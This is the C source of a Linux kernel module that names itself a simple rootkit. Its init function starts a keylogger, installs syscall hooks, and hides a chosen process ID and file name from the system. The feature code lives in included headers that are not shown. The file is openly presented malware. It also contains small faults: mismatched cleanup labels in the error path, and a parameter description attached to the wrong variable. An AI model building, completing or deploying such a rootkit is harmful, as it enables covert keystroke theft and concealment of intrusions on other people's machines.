#include <linux/module.h>
#include "simple_rootkit.h"
#include "fops.h"
#include "keylogger.h"
#include "etc.h"
#include "hooking.h"
#include "hide_proc.h"
#include "hide_file.h"

// module documentation
MODULE_LICENSE(DRIVER_LICENSE);
MODULE_AUTHOR(DRIVER_AUTHOR);
MODULE_DESCRIPTION(DRIVER_DESC);

// module paramters
char *pid;
module_param(pid, charp, S_IRUGO);
MODULE_PARM_DESC(pid, "The pid of the process we wish to hide, as a string.");

char *file_name;
module_param(file_name, charp, S_IRUGO);
MODULE_PARM_DESC(pid, "The name of the file we wish to hide, as a string.");

// the init function of the module
static int __init rootkit_init(void) {
	int status;

	// cannot fail
	init_hooking();

	// try to call initialization function of every feature.
	// if any fails, free all resources and exit with an error 
	status = init_fops();
	if (status) goto fops;
	status = init_keylogger();
	if (status) goto keylogger;

	if (pid) {
		status = init_hide_proc(pid);
		if (status) goto hide_proc;
	}

	if (file_name) {
		status = init_hide_file(file_name);
		if (status) goto hide_file;
	}

	status = hook();
	if (status) goto hook;

	// no error, exit succesfully
	printk(KERN_INFO "[+] Module loading successful, inside %s.\n", __FUNCTION__);
	return status;

	// at least one failed, call exit of all others who have already initialized
	hook:
	hide_file:		exit_hooking();
	hide_proc:		exit_keylogger();
	keylogger:		exit_fops();
	fops:
	printk(KERN_INFO "[-] Module loading failed, inside %s.\n", __FUNCTION__);
	return status;
}

// release all resources and exit
static void __exit rootkit_exit(void) {
	exit_hooking();
	exit_fops();
	exit_keylogger();
	printk(KERN_INFO "[-] Module unloaded, inside %s.\n", __FUNCTION__);
}

// macros for defining the module init and exit functions
module_init(rootkit_init);
module_exit(rootkit_exit);
